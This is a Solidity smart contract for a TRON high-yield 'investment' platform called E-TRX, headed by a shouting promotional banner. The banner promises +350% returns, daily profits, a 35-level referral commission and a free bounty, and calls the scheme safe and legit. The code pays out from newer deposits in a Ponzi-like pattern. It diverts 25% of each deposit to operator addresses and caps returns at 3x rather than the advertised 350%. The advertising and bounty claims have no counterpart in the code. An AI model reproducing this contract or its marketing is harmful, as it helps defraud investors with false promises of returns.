//SourceUnit: e_trx_v3.sol

/*   ========= [ E-TRX.COM ] BE A FIRST IN YOUR COUNTRY !! CONTRIBUTION NOW!!! AVAILABLE BOUNTY BONUS FREE 35,000,000 TRX ( JOIN NOW ) [ E-TRX.COM ] =========
 *
 * 
 *   MAIN OFFICIAL WEBSITE : [ https://e-trx.com/ ] 
 *
 *   ALL OFFICIAL WEBSITE & Short Domain 
 *                           https://e-trx.net | https://e-trx.org | https://e-trx.biz | https://e-trx.cc | https://e-trx.co
 *                           https://e-trx.pro | https://e-trx.club | https://e-trx.site | https://e-trx.xyz | https://e-trx.info
 *                           https://e-trx.online | https://e-trx.space | https://e-trx.work | https://e-trx.website | https://e-trx.casa
 *
 *   [ E-TRX.COM ] Min 100 TRX Grow +350% YOUR TRX !! WITH 35 LEVEL REFFERAL COMMISSION! YESSS 35 LEVEL REFFERAL !!!! 
 *   [ E-TRX.COM ] THE FIRST EVER SEEN!!  35x LEVEL REFERAL SYSTEM! +350% PROFITS! +AUTOMATIC NETWORK ADVERTISE EVERY/100 TRX 
 *   [ E-TRX.COM ] Verified, Safe and legit! ANYONE CAN AUDIT THIS! 
 *   [ E-TRX.COM ] AVAILABLE BOUNTY BONUS FREE 35,000,000 TRX ( JOINED NOW )
 *
 *   ========= [ E-TRX.COM ] AVAILABLE Representatives ALL COUNTRY ~  AVAILABLE BOUNTY BONUS FREE 35,000,000 TRX ( JOINED NOW ) [ E-TRX.COM ] =========
 *
 *     [ EXLUSIVE FEATURE ONLY AT E-TRX.COM ] [CRAZY!!! TRX WILL COME TO YOUR ADDRESS EVERY SECOND ]
 *   - Minimal Contribution : 100 TRX - MAX 10,000,000 TRX.
 *   - +350% TOTAL INCOME ~ GET TRX EVERY MILISECOND! NO NEED ANYTHING - JUST RELAX AND TRON(TRX) COME TO YOU EVERY MOMENT!
 *   - 35 Levels Refferals Commissions,Auto Withdraw Refferals to your TRX Address ( CRAZY!!! TRX WILL COME TO YOUR ADDRESS EVERY SECOND NO NEED WITHDRAWAL)
 *   - Withdraw Your Profits % any time You want!!!!
 *   - AUTOMATIC ADVERTISE ON NETWORK [ AFTER CONTRIBUTION EVERY/100 TRX DEPOSIT SMARTCONTRACT WILL AUTOMATIC ADVERTISE IN ALL NETWORK WITH 10000 IMPRESIONS ]
 *
 *   GET Upto +3.5% / Daily Profits  / Earning Every Moment Until +350% per every Tron(TRX) deposit !
 *   Daily Profits [ DEFAULT PROFITS ] : +1% EVERY DAY every contribution since the date it was made. EARN EVERY MOMENT ( NO WAITING ) 
 *   COMPOUND BONUS : When you do not withdraw money, your rewards rate increases by 0.1% every 24 hours. ( Max 0,5%)
 *   ADVERTISE BONUS : Add +0.1% additional fee every time the platform distributes 40,000,000 TRX Referral rewards (Max 0.5%)
 *   PARTY User BONUS: Earn +0.1% additional reward for every 50,000 active users on the platform (Max 0.5%)
 *   BIG AMOUNT BONUS: Get +0.2% additional reward for every 100,000,000 TRX on Smart Contract Balance. (Max %1)
 *
 *   [AMAZING AFFILIATE PROGRAM 35 LEVELS ]
 *   [CRAZY!!! TRX WILL COME TO YOUR ADDRESS EVERY SECOND ]
 *   [35-level referral commission ] 
 *      Level 1 : [ 20% ]
 *      Level 2 : [ 10% ]
 *      Level 3 : [ 5% ]
 *      Level 4 : [ 2% ]
 *      Level 5 : [ 1% ]  
 *      Level 6 ~ 10 : [ 0.5% ]
 *      Level 11 ~ 20 : [ 0.2% ]
 *      Level 21 ~ 35 : [ 0.1% ]
 *      +++ALL COMMISSION DIRECTLY TO YOUR TRON ADDRESS NO NEED WITHDRAW - JUST SEE YOUR TRON(TRX) GROWING UP EVERY SECOND!++++
 *      Referral rewards works only for activated wallets
 */

pragma solidity 0.5.10;
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}
contract ETRX {
    using SafeMath for uint;

    uint constant public DEPOSITS_MAX = 100;
    uint constant public INVEST_MIN_AMOUNT = 100 trx;
    uint constant public INVEST_MAX_AMOUNT = 10000000 trx;
    uint constant public BASE_PERCENT = 100;
    uint[] public REFERRAL_PERCENTS = [2000, 1000, 500, 200, 100, 50, 50, 50, 50, 50, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10];
    uint constant public MARKETING_FEE = 1200;
    uint constant public PROJECT_FEE = 800;
    uint constant public ADMIN_FEE = 500;
    uint constant public MAX_CONTRACT_PERCENT = 100;
    uint constant public MAX_LEADER_PERCENT = 50;
    uint constant public MAX_HOLD_PERCENT = 50;
    uint constant public MAX_COMMUNITY_PERCENT = 50;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 100000000 trx;
    uint constant public LEADER_BONUS_STEP = 40000000 trx;
    uint constant public COMMUNITY_BONUS_STEP = 50000;
    uint constant public TIME_STEP = 1 days;
    uint public totalInvested;
    address payable public marketingAddress;
    address payable public projectAddress;
    address payable public adminAddress;
    uint public totalDeposits;
    uint public totalWithdrawn;
    uint public contractPercent;
    uint public contractCreationTime;

    uint public totalRefBonus;
    
    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
       
        uint32 start;
    }
    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        uint64 bonus;
        uint24[35] refs;
       
    }
    mapping (address => User) internal users;
    mapping (uint => uint) internal turnover;
    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event RefBack(address indexed referrer, address indexed referral, uint amount);
    event FeePayed(address indexed user, uint totalAmount);

    constructor(address payable marketingAddr, address payable projectAddr, address payable adminAddr) public {
        require(!isContract(marketingAddr) && !isContract(projectAddr));
        marketingAddress = marketingAddr;
        projectAddress = projectAddr;
        adminAddress = adminAddr;
        contractCreationTime = block.timestamp;
     
        contractPercent = getContractBalanceRate();
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getContractBalanceRate() public view returns (uint) {
        uint contractBalance = address(this).balance;
        uint contractBalancePercent = BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(20));

        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }
    
    function getLeaderBonusRate() public view returns (uint) {
        uint leaderBonusPercent = totalRefBonus.div(LEADER_BONUS_STEP).mul(10);

        if (leaderBonusPercent < MAX_LEADER_PERCENT) {
            return leaderBonusPercent;
        } else {
            return MAX_LEADER_PERCENT;
        }
    }
    
    function getCommunityBonusRate() public view returns (uint) {
        uint communityBonusRate = totalDeposits.div(COMMUNITY_BONUS_STEP).mul(10);

        if (communityBonusRate < MAX_COMMUNITY_PERCENT) {
            return communityBonusRate;
        } else {
            return MAX_COMMUNITY_PERCENT;
        }
    }
    
    function withdraw() public {
        User storage user = users[msg.sender];

        uint userPercentRate = getUserPercentRate(msg.sender);
		uint communityBonus = getCommunityBonusRate();
		uint leaderbonus = getLeaderBonusRate();

        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(3)) {
                    dividends = (uint(user.deposits[i].amount).mul(3)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); 
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > 0, "User has no dividends");

        uint contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }
        
        user.checkpoint = uint32(block.timestamp);

        msg.sender.transfer(totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);


        emit Withdrawn(msg.sender, totalAmount);
    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return contractPercent.add(timeMultiplier);
        } else {
            return contractPercent;
        }
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);
		uint communityBonus = getCommunityBonusRate();
		uint leaderbonus = getLeaderBonusRate();

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(3)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(3)) {
                    dividends = (uint(user.deposits[i].amount).mul(3)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);


            }

        }

        return totalDividends;
    }
    
    function invest(address referrer) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);

        require(msg.value >= INVEST_MIN_AMOUNT && msg.value <= INVEST_MAX_AMOUNT, "Bad Deposit");

        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");



        uint msgValue = msg.value;



        uint marketingFee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint projectFee = msgValue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		uint adminFee = msgValue.mul(ADMIN_FEE).div(PERCENTS_DIVIDER);

        marketingAddress.transfer(marketingFee);
        projectAddress.transfer(projectFee);
		adminAddress.transfer(adminFee);

        emit FeePayed(msg.sender, marketingFee.add(projectFee));

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }

        if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < 35; i++) {
                if (upline != address(0)) {
                    uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

                    // }

                    if (amount > 0) {
                        address(uint160(upline)).transfer(amount);
                        users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));
                        
                        totalRefBonus = totalRefBonus.add(amount);
                        emit RefBonus(upline, msg.sender, i, amount);
                    }

                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint64(msgValue), 0, uint32(block.timestamp)));

        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }

        emit NewDeposit(msg.sender, msgValue);
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(3);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }
    
    function getUserLastDeposit(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return user.checkpoint;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn));
        }

        return amount;
    }

    function getCurrentHalfDay() public view returns (uint) {
        return (block.timestamp.sub(contractCreationTime)).div(TIME_STEP.div(2));
    }


    function getCurrentHalfDayTurnover() public view returns (uint) {
        return turnover[getCurrentHalfDay()];
    }


    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory refback = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
          
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats() public view returns (uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, address(this).balance, contractPercent);
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint64, uint24[35] memory) {
        User storage user = users[userAddress];

        return (user.referrer, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}